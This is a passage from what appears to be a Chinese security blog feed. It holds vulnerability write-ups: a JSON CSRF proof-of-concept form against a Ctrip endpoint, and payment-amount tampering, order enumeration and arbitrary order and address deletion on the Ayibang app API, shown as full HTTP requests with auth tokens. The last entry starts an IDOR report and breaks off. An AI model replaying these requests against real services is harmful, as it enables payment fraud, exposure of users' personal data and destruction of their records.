Poc</code>数据包中的如下代码是干嘛的:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;PublishStatus&quot;:1&apos; value=&apos;&quot;&#125;&apos;</span><br></pre></td></tr></table></figure></p><p>那么下面我就来解答一下~</p><h6 id="首先"><a href="#首先" class="headerlink" title="首先"></a>首先</h6><p>我们打开这个构造好的<code>Csrf Poc</code>，并且抓包。</p><p><img src="http://static.zybuluo.com/1kbfree/bg5tze0r4ilxfnyk4hx2zqs1/image_1cggulta21htoq8d1q47dqm12nc1t.png" alt="image_1cggulta21htoq8d1q47dqm12nc1t.png-161.4kB"></p><p>可以看到，这里会多出一个<code>=</code>号，这是为什么呢？我就不拐弯抹角了，看如下案例。</p><h6 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h6><p>创建一个<code>1.html</code>文件，代码如下:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>iamfree<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"https://www.baidu.com"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"value"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>我们在浏览器打开这个<code>html</code>文件并且抓包~</p><p><img src="http://static.zybuluo.com/1kbfree/hzrjgza3ogjghpkbdxwlxp4a/image_1cggv215618qv1c332bsaufrse2a.png" alt="image_1cggv215618qv1c332bsaufrse2a.png-113kB"></p><blockquote><p>看到这里的 <code>=</code> 号了吗，也就是说但我们在设置一个 <code>input</code> 属性的时候,会将<code>name</code>的值和<code>value</code>的值以一个等于号的形式传递，所以说上面我们构造好的<code>Csrf Poc</code>就是为了将这个<code>=</code>号放在数据里面，否则传递的<code>Json</code>会报错~</p></blockquote><h4 id="6-浏览器处打开这个Poc"><a href="#6-浏览器处打开这个Poc" class="headerlink" title="6. 浏览器处打开这个Poc"></a>6. 浏览器处打开这个Poc</h4><p><img src="http://static.zybuluo.com/1kbfree/jec1gasck1j6t5ns9dyyve3e/image_1cggvbjp914dp14bt1mec1j0r15vi2n.png" alt="image_1cggvbjp914dp14bt1mec1j0r15vi2n.png-32kB"></p><p><img src="http://static.zybuluo.com/1kbfree/a3m0bhbmy7ximhww0y1rkas3/image_1cggvcoam1i5h3q4njf1sf41a3034.png" alt="image_1cggvcoam1i5h3q4njf1sf41a3034.png-46.6kB"></p><p>我们确认一下是否可以发布</p><p><img src="http://static.zybuluo.com/1kbfree/ykureziocu1mytqfp1b16wm9/image_1cggve0kq18quhsf1j4al8hfi4h.png" alt="image_1cggve0kq18quhsf1j4al8hfi4h.png-330.1kB"></p><p><em>可以看到并没有发布，这其中肯定有猫腻，我们再继续分析一波</em></p><h4 id="7-分析异常"><a href="#7-分析异常" class="headerlink" title="7. 分析异常"></a>7. 分析异常</h4><p><img src="http://static.zybuluo.com/1kbfree/57mwvrqtms0a7zrmawc0dflg/image_1cggvl77q79isqk1l4di5ts0u4u.png" alt="image_1cggvl77q79isqk1l4di5ts0u4u.png-129.2kB"></p><h4 id="8-异常处理"><a href="#8-异常处理" class="headerlink" title="8. 异常处理"></a>8. 异常处理</h4><blockquote><p>异常分析后修改的<code>Csrf Poc</code>如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">history.pushState('', '', '/');</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://you.ctrip.com/TravelSite/Member/SaveNewTravel"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"text/plain"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">'&#123;"Content":"&lt;p&gt;1111111111&lt;/p&gt;","UploadPicContent":"","CoverImageId":0,"TravelId":"3689394","CoverLocationY":0,"ClassifiedInfo":&#123;"DistrictList":[&#123;"DistrictId":"110000","DistrictName":"涓浗锛屼簹娲�","IsSelected":true&#125;,&#123;"DistrictId":"1","DistrictName":"鍖椾含锛屼腑鍥�","IsSelected":true&#125;],"TagList":[],"TravelId":"3689394","ClassifiedType":6,"TravelDays":1111111111,"DepartureDate":"2018-06-13","Consume":111,"CompanionType":1&#125;,"PublishStatus":1,"Title":"1111'</span> <span class="attr">value</span>=<span class="string">'"&#125;'</span> <span class="attr">type</span>=<span class="string">'hidden'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p></blockquote><h4 id="9-在浏览器处打开此POC"><a href="#9-在浏览器处打开此POC" class="headerlink" title="9. 在浏览器处打开此POC"></a>9. 在浏览器处打开此POC</h4><p><img src="http://static.zybuluo.com/1kbfree/knjs1crgvnkuduke1akrzii8/image_1cgh0lpg61nhdgll1aqj1a3h1f0t78.png" alt="image_1cgh0lpg61nhdgll1aqj1a3h1f0t78.png-28.3kB"></p><p><img src="http://static.zybuluo.com/1kbfree/1nil8f18impk1tdhrbjynau8/image_1cgh0mh7sh7ujg710vt1uhc1sd47l.png" alt="image_1cgh0mh7sh7ujg710vt1uhc1sd47l.png-309.5kB"></p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
      
      <categories>
          
          <category> Web攻防 </category>
          
          <category> 渗透测试 </category>
          
          <category> 作者：Iamfree </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> Json Csrf </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>腾讯某处SSRF漏洞</title>
      <link href="/2018/06/16/%E8%85%BE%E8%AE%AF%E6%9F%90%E5%A4%84SSRF%E6%BC%8F%E6%B4%9E/"/>
      <url>/2018/06/16/%E8%85%BE%E8%AE%AF%E6%9F%90%E5%A4%84SSRF%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<a id="more"></a><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
      
      
    </entry>
    
    <entry>
      <title>阿姨帮最新APP漏洞大全(支付漏洞/地址/订单遍历/删除等)</title>
      <link href="/2018/06/16/%E9%98%BF%E5%A7%A8%E5%B8%AE%E6%9C%80%E6%96%B0APP%E6%BC%8F%E6%B4%9E%E5%A4%A7%E5%85%A8/"/>
      <url>/2018/06/16/%E9%98%BF%E5%A7%A8%E5%B8%AE%E6%9C%80%E6%96%B0APP%E6%BC%8F%E6%B4%9E%E5%A4%A7%E5%85%A8/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>危害：看文章自己脑补<br>漏洞等级：高<br>提交时间：   2016-02-02 12:45</p></blockquote><a id="more"></a>    <h3 id="简要描述："><a href="#简要描述：" class="headerlink" title="简要描述："></a>简要描述：</h3><p>阿姨帮最新版APP(v6.2.0)漏洞打包</p><h3 id="详细说明："><a href="#详细说明：" class="headerlink" title="详细说明："></a>详细说明：</h3><h4 id="支付漏洞"><a href="#支付漏洞" class="headerlink" title="支付漏洞"></a>支付漏洞</h4><h5 id="1-超低价格支付订单"><a href="#1-超低价格支付订单" class="headerlink" title="1. 超低价格支付订单"></a>1. 超低价格支付订单</h5><p>点击首页，随便选择一项服务并下订单</p><p><img src="http://static.zybuluo.com/1kbfree/nwywtw101sydlcvxyun0xxu5/image_1cg3udg33qk4cgk6f64krptq9.png" alt="image_1cg3udg33qk4cgk6f64krptq9.png-62.5kB"></p><p><img src="http://static.zybuluo.com/1kbfree/og7jbdinrgav66gvtqjcohfy/image_1cg3ufnh119mf1a2a1edf5vbjum.png" alt="image_1cg3ufnh119mf1a2a1edf5vbjum.png-78.7kB"></p><h5 id="2-点击确认支付抓包并先截断提交："><a href="#2-点击确认支付抓包并先截断提交：" class="headerlink" title="2. 点击确认支付抓包并先截断提交："></a>2. 点击确认支付抓包并先截断提交：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST https://api-cust.ayibang.com/v1/pay/wx/sign HTTP/1.1</span><br><span class="line">User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;</span><br><span class="line">Authorization: 30f6188161eb1a0bc7d245c49c01a208bb3cee34</span><br><span class="line">Network: WiFi</span><br><span class="line">City: beijing</span><br><span class="line">Timestamp: 1452845167007</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Host: api-cust.ayibang.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">Content-Length: 128</span><br><span class="line">out_trade_no=11291191&amp;attach=0_1_13800000000_0&amp;body=%E9%98%BF%E5%A7%A8%E5%B8%AE%E6%94%AF%E4%BB%98&amp;total_fee=5000&amp;trade_type=AP</span><br></pre></td></tr></table></figure><p><em>将上面的total_fee的值改为1，提交</em></p><p><img src="http://static.zybuluo.com/1kbfree/1r7oj128q2miz6cc0q1y66ik/image_1cg3ul0q0178ondf136n1bklbpj13.png" alt="image_1cg3ul0q0178ondf136n1bklbpj13.png-38.2kB"></p><p><em>支付成功后订单成为待确认状态，说明支付成功</em></p><p><img src="http://static.zybuluo.com/1kbfree/uv9e3uhr4itz91mlaqkjp4hw/image_1cg3ulbjk776vs8imhrn34kd1g.png" alt="image_1cg3ulbjk776vs8imhrn34kd1g.png-47.3kB"></p><h4 id="任意用户订单查看"><a href="#任意用户订单查看" class="headerlink" title="任意用户订单查看"></a>任意用户订单查看</h4><p>点击我们刚生成的订单，系统访问如下地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET https://api-cust.ayibang.com/v1/order/detail?orderID=11291191 HTTP/1.1</span><br><span class="line">User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;</span><br><span class="line">Authorization: 30f6188161eb1a0bc7d245c49c01a208bb3cee34</span><br><span class="line">Network: WiFi</span><br><span class="line">City: beijing</span><br><span class="line">Timestamp: 1452845324989</span><br><span class="line">Host: api-cust.ayibang.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br></pre></td></tr></table></figure><p><em>orderID=11291191处可遍历，burp出手对订单的后四位遍历</em></p><p><img src="http://static.zybuluo.com/1kbfree/tarjvjo28tnq0almee667dqm/image_1cg3untagce0og8n901nln75e1t.png" alt="image_1cg3untagce0og8n901nln75e1t.png-212.4kB"></p><p>N多订单信息可看</p><p><img src="http://static.zybuluo.com/1kbfree/iu8l9ftbkxioegspg7psf7bz/image_1cg3uo8rl1o5ii0p3kfrq8117h2a.png" alt="image_1cg3uo8rl1o5ii0p3kfrq8117h2a.png-282.2kB"></p><p><em>以订单ID为11290071为例，可查看到该订单涉及用户的姓名 手机号 住址等</em></p><p><img src="http://static.zybuluo.com/1kbfree/mzxfhiyt1fdrikeevmdw5tt7/image_1cg3uokl71f7b1um568d15kjcjs2n.png" alt="image_1cg3uokl71f7b1um568d15kjcjs2n.png-228.7kB"></p><h4 id="任意用户订单取消漏洞"><a href="#任意用户订单取消漏洞" class="headerlink" title="任意用户订单取消漏洞"></a>任意用户订单取消漏洞</h4><p>点击之前的订单，点击取消订单，会抓到如下请求包:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST https://api-cust.ayibang.com/v1/order/cancel HTTP/1.1</span><br><span class="line">User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;</span><br><span class="line">Authorization: 30f6188161eb1a0bc7d245c49c01a208bb3cee34</span><br><span class="line">Network: WiFi</span><br><span class="line">City: beijing</span><br><span class="line">Timestamp: 1452846770206</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Host: api-cust.ayibang.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">Content-Length: 42</span><br><span class="line">data=%7B%22orderID%22%3A%2211291191%22%7D&amp;</span><br></pre></td></tr></table></figure></p><blockquote><p>post处内容url解码后为：{“orderID”:”11291191”}</p></blockquote><ul><li>通过遍历orderID可删除所有订单</li><li>通过另一手机注册一个账号并下一个订单</li></ul><p><img src="http://static.zybuluo.com/1kbfree/mzp7hnp0e2a87hahk7jiq8ql/image_1cg3ur1ec14g027r19g41dkt1mcf34.png" alt="image_1cg3ur1ec14g027r19g41dkt1mcf34.png-40.7kB"></p><ul><li>抓包查得该订单ID为11292401</li></ul><p>提交以下数据包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST https://api-cust.ayibang.com/v1/order/cancel HTTP/1.1</span><br><span class="line">User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;</span><br><span class="line">Authorization: 30f6188161eb1a0bc7d245c49c01a208bb3cee34</span><br><span class="line">Network: WiFi</span><br><span class="line">City: beijing</span><br><span class="line">Timestamp: 1452846770206</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Host: api-cust.ayibang.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">Content-Length: 42</span><br><span class="line">data=%7B%22orderID%22%3A%2211292401%22%7D&amp;</span><br></pre></td></tr></table></figure><p><em>成功取消订单</em></p><p><img src="http://static.zybuluo.com/1kbfree/8zylu68skeytdn4sc58pfbfd/image_1cg3ut157c3iebiblu6bi9uo3h.png" alt="image_1cg3ut157c3iebiblu6bi9uo3h.png-203.1kB"></p><p><strong>再查看该用户订单列表，已经成为空：</strong></p><p><img src="http://static.zybuluo.com/1kbfree/22w1a0rxqcjyi8hjuq8ytgjq/image_1cg3utb0fmnlhhrq2vb4ibrj3u.png" alt="image_1cg3utb0fmnlhhrq2vb4ibrj3u.png-26.9kB"></p><h4 id="任意用户服务地址删除"><a href="#任意用户服务地址删除" class="headerlink" title="任意用户服务地址删除"></a>任意用户服务地址删除</h4><h5 id="1-点击app里面服务地址"><a href="#1-点击app里面服务地址" class="headerlink" title="1. 点击app里面服务地址"></a>1. 点击app里面服务地址</h5><p><img src="http://static.zybuluo.com/1kbfree/ppen0j15r6x111062t026kzr/image_1cg3uu7cn1ogc1ii614lh1r111qnm4b.png" alt="image_1cg3uu7cn1ogc1ii614lh1r111qnm4b.png-46.6kB"></p><h5 id="2-添加两个地址"><a href="#2-添加两个地址" class="headerlink" title="2. 添加两个地址"></a>2. 添加两个地址</h5><p><img src="http://static.zybuluo.com/1kbfree/cms8wr2368k53n9yeri8dsw0/image_1cg3uurka153p7s6m3c1lc1ohf4o.png" alt="image_1cg3uurka153p7s6m3c1lc1ohf4o.png-28.1kB"></p><p><strong>然后删除上面的两个地址，并抓包</strong></p><h6 id="1-删除第一个地址请求数据包如下："><a href="#1-删除第一个地址请求数据包如下：" class="headerlink" title="1. 删除第一个地址请求数据包如下："></a>1. 删除第一个地址请求数据包如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET https://api-cust.ayibang.com/v1/house/delete?houseID=17334752 HTTP/1.1</span><br><span class="line">User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;</span><br><span class="line">Authorization: 211ebac721824b5cb688e3c6d1187bc21beff557</span><br><span class="line">Network: WiFi</span><br><span class="line">City: nanjing</span><br><span class="line">Timestamp: 1452841496773</span><br><span class="line">Host: api-cust.ayibang.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br></pre></td></tr></table></figure><p>返回数据包如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Fri, 15 Jan 2016 07:04:57 GMT</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Connection: close</span><br><span class="line">X-Powered-By: PHP/5.6.11</span><br><span class="line">Content-Length: 628</span><br><span class="line">&#123;&quot;house&quot;:&#123;&quot;id&quot;:&quot;17334752&quot;,&quot;custID&quot;:&quot;16989352&quot;,&quot;city&quot;:&quot;nanjing&quot;,&quot;cityName&quot;:&quot;\u5357\u4eac&quot;,&quot;zone&quot;:&quot;null&quot;,&quot;nameAddr&quot;:&quot;\u5b9e\u9a8c\</span><br></pre></td></tr></table></figure></p><p>上面内容解码后如下：<br><img src="http://static.zybuluo.com/1kbfree/hw8ryqt15emqjebjk8f8awp7/image_1cg3v42g41m3b18ku15es1ea418n055.png" alt="image_1cg3v42g41m3b18ku15es1ea418n055.png-104.9kB"></p><blockquote><p>可以看到statusName处标记为已删除，并且数据包返回的ID与删除的ID为同一ID：17334752</p></blockquote><p><strong>再删除另外一个地址：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET https://api-cust.ayibang.com/v1/house/delete?houseID=17336562 HTTP/1.1</span><br><span class="line">User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;</span><br><span class="line">Authorization: 211ebac721824b5cb688e3c6d1187bc21beff557</span><br><span class="line">Network: WiFi</span><br><span class="line">City: nanjing</span><br><span class="line">Timestamp: 1452841783577</span><br><span class="line">Host: api-cust.ayibang.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br></pre></td></tr></table></figure></p><blockquote><p>由此可看到系统删除服务地址是根据不同的ID来实现的，虽然数字不是连续的，但是经过几次尝试发现都是以17开头的8位数字，如此遍可以通过遍历id删除其它用户的服务地址</p></blockquote><p><strong>只需提交以下数据包：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET https://api-cust.ayibang.com/v1/house/delete?houseID=17336562 HTTP/1.1</span><br><span class="line">User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;</span><br><span class="line">Authorization: 211ebac721824b5cb688e3c6d1187bc21beff557</span><br></pre></td></tr></table></figure></p><p>通过burpsuite 遍历houseID处，即可删除所有用户收获地址</p><p><strong>以下为我随便找的一个用户地址（抱歉给这位用户带来困扰）：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET https://api-cust.ayibang.com/v1/house/delete?houseID=17330512 HTTP/1.1</span><br><span class="line">Host: api-cust.ayibang.com</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36 OPR/34.0.2036.47</span><br><span class="line">DNT: 1</span><br><span class="line">Accept-Encoding: gzip, deflate, lzma, sdch</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br></pre></td></tr></table></figure></p><p><strong>返回：</strong><br><img src="http://static.zybuluo.com/1kbfree/o4qwyxhj25dogg6q0mc245ma/image_1cg3v85b91grlggsheep5k144b5i.png" alt="image_1cg3v85b91grlggsheep5k144b5i.png-104.3kB"></p><h3 id="漏洞证明"><a href="#漏洞证明" class="headerlink" title="漏洞证明"></a>漏洞证明</h3><p>如果需要通过浏览器复现上面问题，需要注意数据请求处有一个请求头：<br><code>Authorization: 211ebac721824b5cb688e3c6d1187bc21beff557</code><br>此处的authorization是用户在登录APP的时候服务器返回的认证key<br><img src="http://static.zybuluo.com/1kbfree/1esugc3rjsugawvsoapq73j0/image_1cg3vad5f5mr1rjf6j9k5m1fv55v.png" alt="image_1cg3vad5f5mr1rjf6j9k5m1fv55v.png-279.8kB"></p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
      
      <categories>
          
          <category> 乌云历史文章 </category>
          
          <category> Web攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> 支付漏洞 </tag>
            
            <tag> 越权漏洞 </tag>
            
            <tag> Xss漏洞 </tag>
            
            <tag> 密码逻辑漏洞 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>暴风魔镜某处设计缺陷可获取整站用户信息(xss/越权/密码逻辑/支付漏洞等)</title>
      <link href="/2018/06/16/%E6%9A%B4%E9%A3%8E%E9%AD%94%E9%95%9C%E6%9F%90%E5%A4%84%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%8F%AF%E8%8E%B7%E5%8F%96%E6%95%B4%E7%AB%99%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF/"/>
      <url>/2018/06/16/%E6%9A%B4%E9%A3%8E%E9%AD%94%E9%95%9C%E6%9F%90%E5%A4%84%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%8F%AF%E8%8E%B7%E5%8F%96%E6%95%B4%E7%AB%99%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>危害：看文章自己脑补<br>漏洞等级：高<br>提交时间：   2016-04-20 18:15</p></blockquote><a id="more"></a><h3 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h3><p>a、首先来到用户信息地址管理这边</p><p><img src="http://static.zybuluo.com/1kbfree/by1eecokc7syxsb2b4he3dal/image_1cg3o6vu41qvff0jgoj55hn429.png" alt="image_1cg3o6vu41qvff0jgoj55hn429.png-18.3kB"></p><p>b、编辑保存抓包 当前用户地址是<code>48783</code> 改了下<code>48782</code>就直接遍历出来了</p><p><img src="http://static.zybuluo.com/1kbfree/b1nvfq2np6deai3hapi0alxd/image_1cg3o8is916j81koa1mpj18j7bkfm.png" alt="image_1cg3o8is916j81koa1mpj18j7bkfm.png-99.5kB"></p><p>c、下面直接遍历addressid</p><p><img src="http://static.zybuluo.com/1kbfree/c2uy1ihh6oi9uvv88cah7aaj/image_1cg3o968q13s2oqi11p5ipp3dc13.png" alt="image_1cg3o968q13s2oqi11p5ipp3dc13.png-46.5kB"></p><p>d、burp里显示乱码</p><p><img src="http://static.zybuluo.com/1kbfree/fqlpxgwom2s69n20ku78r9j4/image_1cg3o9re5buo1o9k2c116b21v9620.png" alt="image_1cg3o9re5buo1o9k2c116b21v9620.png-93.3kB"></p><p>e、然后导出到本地就变成中文啦 证明危害即可遍历几条</p><p><img src="http://static.zybuluo.com/1kbfree/rz0qcmgw0ndbt6aq135awfel/image_1cg3oaevv1q934pa1u1g1if418lc2d.png" 